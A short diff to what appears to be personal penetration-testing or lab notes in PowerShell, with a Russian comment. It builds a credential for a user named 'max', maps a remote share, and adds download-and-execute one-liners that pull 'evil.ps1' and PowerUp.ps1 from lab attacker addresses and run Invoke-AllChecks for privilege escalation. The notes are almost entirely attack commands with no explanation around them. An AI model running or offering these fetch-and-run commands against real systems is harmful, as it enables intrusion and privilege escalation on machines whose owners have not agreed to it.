@@ -116,13 +116,15 @@ $cred = New-Object System.Management.Automation.PsCredential('max, $pass')
 
 New-PSDrive -name max -root \\10.10.14.14\share -Credential $cred -PSProvider "filesystem"
 
-# PowerShellMafia
+# PowerShellMafia (POWERUP)
 
 https://github.com/PowerShellMafia/PowerSploit.git
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
 
-PowerUP
+iex(New-Object Net.Webclient).downloadstring('http://10.10.14.10/PowerUp.ps1')    ---- загружаем PowerUP
+
+потом...
 
 Invoke-AllChecks
 
